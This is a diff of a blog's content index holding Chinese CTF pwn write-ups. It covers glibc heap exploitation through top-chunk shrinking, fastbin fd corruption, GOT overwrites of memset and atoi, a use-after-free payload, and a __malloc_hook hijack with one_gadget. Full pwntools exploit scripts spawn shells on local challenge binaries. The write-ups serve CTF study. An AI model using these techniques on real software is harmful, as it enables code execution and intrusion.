+<p><code>topbin</code>被修改为一个小的值</p>
+<h3 id="得到fastbin"><a href="#得到fastbin" class="headerlink" title="得到fastbin"></a>得到fastbin</h3><p>把剩下的topbin分配掉，留下一个<code>0x90</code>的大小</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172714541.png" alt="image-20200916172714541"></p>
+<p>然后分配一个超过它大小的堆块，这个堆块就会进入<code>fastbin</code>(否则进入<code>unsortedbin</code>)</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172820568.png" alt="image-20200916172820568"></p>
+<p>并且这个<code>fastbin</code>的<code>fd</code>指针可控（堆溢出）</p>
+<p>修改它为<code>memset@got</code>的地址，就可以修改<code>memset    </code>函数</p>
+<p>这里修改成<code>printf</code>然后利用格式化字符串泄漏libc</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173137032.png" alt="image-20200916173137032"></p>
+<p>得到了libc之后在重放一次上面的操作修改<code>atoi@got</code>为<code>system</code>或者<code>one_gadget</code>即可</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173416122.png" alt="image-20200916173416122"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/shiroha/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line">[add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>)]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x71</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line"></span><br><span class="line">memset_addr = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6021c0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(memset_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&#x27;\x30&#x27;</span> + sh.recvuntil(<span class="string">&#x27;\x01&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;c ==&gt; &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">base = c - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">print(<span class="string">&quot;base ==&gt; &quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># one = [0x45226, 0x4527a, 0xf0364]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+        <category>heap</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Upload-Labs 1-5</title>
     <url>//Upload-Labs01.html</url>
     <content><![CDATA[<a id="more"></a>]]></content>
@@ -2021,47 +2243,6 @@
 <p>在CPP中，new对象的时候会创建一个堆块，里面放入参数和函数的地址，这里delete p之后并没有让p指向null，所以p指针还有值，可以被调用，<code>q = srtdup(buf)</code>可以拿到q对应的堆块，<strong>改写其中的指针，使其指向buf + 8 ，然后让buf + 8指向sh()**，就可以调用</strong>sh()**函数</p>
 <p>payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./UAF&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;1233&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x601160</span> + <span class="number">8</span>) + p64(<span class="number">0x40091b</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>pwn</category>
-        <category>heap</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>极光实验室二进制组考核</title>
-    <url>//aurora_bin_test.html</url>
-    <content><![CDATA[<p>极光实验室二进制组考核pwn题wp</p>
-<a id="more"></a>
-
-
-
-<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = setbufs(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> nbytes_4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to add?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  nbytes_4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">1024</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info:&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, *(<span class="keyword">const</span> <span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Add successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * v4 + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">    *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Edit successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">delete</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to remove?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v2 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> &amp;&amp; v2 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (v2 - <span class="number">1</span>) + a1));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Remove successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@ubuntu:~/kaohe$ checksec heap</span><br><span class="line">[*] &#x27;/home/gstalker/kaohe/heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><code>add</code>函数只允许3种堆块<br><code>edit</code>只允许修改两种<br><code>delete</code>也只允许释放两种<br>(那么第三种有什么用啊喂)</p>
-<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>由于在<code>delete</code>之后没有讲指针置0,存在**<code>UAF</code>**漏洞,并且在<code>edit</code>的时候没有检查堆块是否已经被<code>free</code>,所以可以通过修改<code>fastbin</code>的<code>fd</code>指针达到任意地址写</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>首先完善一下各个功能</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. edit a block&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. large&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
-
-<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>一开始我想通过<code>unsorted bin</code>的<code>UAF</code>,但是这里并没有办法(甚至没有<code>unsorted bin</code>)<br>于是试图通过<code>fastbin</code>的<code>fd</code>指针分配到<code>got表</code>附近,泄露<code>libc</code><br>查看一下 <code>got表</code>,寻找合适的size</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:	0x0000000000601e28	0x00007f1287400168</span><br><span class="line">0x602010:	0x00007f12871f0ee0	0x00000000004006a6</span><br><span class="line">0x602020:	0x00007f1286e7e690	0x00000000004006c6</span><br><span class="line">0x602030:	0x00000000004006d6	0x00007f1286f06250</span><br><span class="line">0x602040:	0x00007f1286e2f740	0x00007f1286e93130</span><br><span class="line">0x602050:	0x00007f1286e7ee70	0x0000000000400726</span><br><span class="line">0x602060:	0x0000000000400736	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080 &lt;stdout&gt;:	0x00007f12871d4620	0x0000000000000000</span><br><span class="line">0x602090 &lt;stdin&gt;:	0x00007f12871d38e0	0x0000000000000000</span><br></pre></td></tr></table></figure>
-<p>看到在<code>0x602050</code>的地方有一个 <code>0x70</code>,高兴坏了,然而并不能分配到这里,而且就算是这附近的错位字节也不行(我在这里卡了好久没弄明白为什么,然后看了看<code>__malloc_hook-0x23</code>,发现错位字节的地方是<code>0x7f</code>)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7f12871d3aed &lt;_IO_wide_data_0+301&gt;:	0x12871d2260000000	0x000000000000007f</span><br><span class="line">0x7f12871d3afd:	0x1286e94e20000000	0x1286e94a0000007f</span><br><span class="line">0x7f12871d3b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br></pre></td></tr></table></figure>
-<p>猜想可能是size检查的时候是一个<code>int</code>为单位,再次寻找size,发现<code>0x602030</code>的地方有一个<code>0x40</code>可以利用,但是会失败,可以分配到,然而<code>0x602038</code>是<code>read</code>函数,会破坏它的指针,从而影响程序<br>最后看到<code>0x602060</code>的地方也有<code>0x40</code>,并且下面存在<code>stdin</code>和<code>stdout</code>可以泄露,将<code>fd</code>指向这里</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x60205a</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">c = sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">addr = u64(c)</span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">base = addr - libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;base ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure>
-<h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><p>得到libc之后使用修改<code>__malloc_hook ==&gt; one_gadget</code> 就可以得到shell</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">onegadget = base + one[<span class="number">3</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span> + p64(onegadget) + p64(realloc + <span class="number">0x10</span>))</span><br></pre></td></tr></table></figure>
-<p>再一次分配一个堆块就能得到shell</p>
-]]></content>
       <categories>
         <category>pwn</category>
         <category>heap</category>
@@ -2119,6 +2300,47 @@
       <tags>
         <tag>pwn</tag>
         <tag>dosbox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极光实验室二进制组考核</title>
+    <url>//aurora_bin_test.html</url>
+    <content><![CDATA[<p>极光实验室二进制组考核pwn题wp</p>
+<a id="more"></a>
+
+
+
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = setbufs(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> nbytes_4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to add?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  nbytes_4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">1024</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info:&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, *(<span class="keyword">const</span> <span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> 